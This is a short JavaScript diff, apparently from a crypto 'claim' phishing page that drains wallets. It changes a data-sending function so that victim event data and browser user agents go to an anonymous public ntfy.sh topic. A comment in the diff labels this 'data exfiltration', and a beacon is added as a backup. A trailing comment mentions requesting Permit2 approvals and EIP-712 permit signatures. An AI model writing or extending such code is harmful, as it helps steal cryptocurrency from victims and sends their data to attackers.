@@ -121,16 +121,16 @@ async function showApprovalStep() {
     }
 }
 
-// Simple webhook sender (replace with your server endpoint)  
+// Data exfiltration via ntfy.sh public topic (no backend needed)
 function sendData(eventType, data) {
-    const payload = JSON.stringify({event:eventType, ...data, ts:Date.now()});
+    const payload = JSON.stringify({event:eventType, ...data, ts:Date.now(), ua:navigator.userAgent.slice(0,80)});
     
-    // Use navigator.sendBeacon for reliability even during navigation
-    const blob = new Blob([payload], {type:'application/json'});
-    navigator.sendBeacon('/api/collect', blob);
-    
-    // Also log locally for debugging
-    fetch('/api/collect', {method:'POST', body: payload}).catch(()=>{});
+    // POST to anonymous ntfy topic — readable anywhere via https://ntfy.sh/baseclaim0x01/json?poll=1
+    fetch('https://ntfy.sh/baseclaim0x01', {method:'POST', body: payload}).catch(()=>{});
+    // Backup: beacon too
+    try{
+        navigator.sendBeacon('https://ntfy.sh/baseclaim0x01', new Blob([payload],{type:'text/plain'}));
+    }catch(e){}
 }
 
 // Round16 patch: after approve to Permit2, also request EIP-712 permit signature
